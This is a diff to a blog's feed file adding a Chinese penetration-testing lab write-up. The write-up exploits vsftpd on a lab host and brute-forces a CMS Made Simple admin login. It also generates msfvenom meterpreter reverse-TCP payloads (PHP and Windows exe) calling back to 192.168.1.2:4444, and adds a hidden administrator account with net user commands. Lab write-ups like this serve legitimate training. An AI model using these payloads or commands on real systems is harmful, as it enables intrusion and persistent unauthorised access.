@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>漏洞挖掘实验</title>
+      <link href="/posts/12fff649/"/>
+      <url>/posts/12fff649/</url>
+      
+        <content type="html"><![CDATA[<p>实验拓扑如下</p><p><img src="/posts/12fff649/1583830717716.png" alt></p><p><img src="/posts/12fff649/1583830733667.png" alt></p><h2 id="任务一-寻找漏洞主机"><a href="#任务一-寻找漏洞主机" class="headerlink" title="任务一 寻找漏洞主机"></a>任务一 寻找漏洞主机</h2><p>扫描存活主机(虽然知道了但还是扫一下)</p><p>注意本机ip是192.168.1.2</p><p><img src="/posts/12fff649/1583830890209.png" alt></p><p>-F 选项快速扫描一下其他主机</p><p><img src="/posts/12fff649/1583830929741.png" alt></p><p><img src="/posts/12fff649/1583830945755.png" alt></p><p>既然是ftp，那么就锁定192.168.1.3</p><p>提示了搜索vsftpd (靶机上搜索太慢了，我在自己机器上搜索的)</p><p><img src="/posts/12fff649/1583831162349.png" alt></p><p>然后使用这个exploit去打就行了</p><p><img src="/posts/12fff649/1583831194224.png" alt></p><p>可以看到进去就是root权限hhhh</p><p>然后还要搜索 1.key 这个文件</p><pre><code>find  / -name 1.key</code></pre><p><img src="/posts/12fff649/1583831225885.png" alt></p><p>读一下就好了</p><h2 id="任务二-使用nikto、crunch和burpsuite进行网站渗透和控制"><a href="#任务二-使用nikto、crunch和burpsuite进行网站渗透和控制" class="headerlink" title="任务二 使用nikto、crunch和burpsuite进行网站渗透和控制"></a>任务二 使用nikto、crunch和burpsuite进行网站渗透和控制</h2><p>此时的目标转向了 192.168.1.4 (192.168.1.3都拿到root了)</p><p>打开网站是 Cms made Simple 简称cms cms</p><p><img src="/posts/12fff649/1583831499729.png" alt></p><p>后台地址 <code>/admin/login.php</code></p><p>先设置一个代理</p><p><img src="/posts/12fff649/1583832214527.png" alt></p><p>然后抓个包</p><p><img src="/posts/12fff649/1583832242295.png" alt></p><p>由于密码是 <code>admin</code> 加上三位数字，如果想用 crunch 生成也行，直接用burp也行</p><p>爆破成功</p><p><img src="/posts/12fff649/1583832729565.png" alt></p><p>进入到网站后台</p><p><img src="/posts/12fff649/1583832774511.png" alt></p><h2 id="任务三-获取webshell权限并拿到目标及开放的远程桌面端口号"><a href="#任务三-获取webshell权限并拿到目标及开放的远程桌面端口号" class="headerlink" title="任务三 获取webshell权限并拿到目标及开放的远程桌面端口号"></a>任务三 获取webshell权限并拿到目标及开放的远程桌面端口号</h2><p>漏洞点在这</p><p><img src="/posts/12fff649/1583833127686.png" alt></p><p>Run一下</p><p><img src="/posts/12fff649/1583833240668.png" alt></p><p>好那我们这里为了避免网页卡顿。用msf生成一个shell.php</p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f raw -o shell.txt</code></pre><p>然后复制到框框里运行一下</p><p>同时msf进行监听</p><p><img src="/posts/12fff649/1583833748737.png" alt></p><p>成功弹到shell。之后再使用msf生成shell.exe</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f exe -o shell.exe</code></pre><p>上传，重新弹一个shell</p><p><img src="/posts/12fff649/1583833790609.png" alt></p><p>ok这时候就能获得真正的meterpreter了</p><p>查看一下监听端口</p><p><img src="/posts/12fff649/1583833821793.png" alt></p><p>随便猜一个吧2333</p><h2 id="任务四-向目标主机添加用户并控制"><a href="#任务四-向目标主机添加用户并控制" class="headerlink" title="任务四 向目标主机添加用户并控制"></a>任务四 向目标主机添加用户并控制</h2><p>这个步骤和上一个实验比较相似，就不用细说了</p><pre><code>net user hacker Beijing123 /addnet localgroup administrators hacker /add</code></pre><p>远程登陆之后，给文件添加一个用户即可</p><p>最后</p><p><img src="/posts/12fff649/1583833940934.png" alt></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 实验 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>企业环境渗透2</title>
       <link href="/posts/c08799e1/"/>
       <url>/posts/c08799e1/</url>
